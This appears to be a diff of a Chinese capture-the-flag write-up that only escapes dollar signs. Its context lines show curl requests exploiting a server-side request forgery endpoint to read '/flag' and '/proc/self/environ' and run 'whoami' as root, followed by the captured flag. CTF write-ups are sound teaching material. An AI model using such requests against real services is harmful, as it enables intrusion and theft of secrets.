@@ -161,10 +161,10 @@ pre, pre code, .highlight, .hljs {
 
 > bash
 > C:\Users\G1731>curl "http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag"
-> 离$FLAG很近了哦
+> 离\$FLAG很近了哦
 >
 > C:\Users\G1731>curl "http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ"
-> 离$FLAG很近了哦
+> 离\$FLAG很近了哦
 >
 > C:\Users\G1731>curl "http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami"
 > root
@@ -176,7 +176,7 @@ pre, pre code, .highlight, .hljs {
 
 Great！ G0D{e03bef26-6922-4157-abed-8e979286cf98} 一下子就拿到flag了。
 
-说实话，我一开始做的时候看了无数遍离$FLAG很近了哦就是找不到flag，还以为做不出来呢。
+说实话，我一开始做的时候看了无数遍离\$FLAG很近了哦就是找不到flag，还以为做不出来呢。
 
 咕咕嘎嘎！！！
 
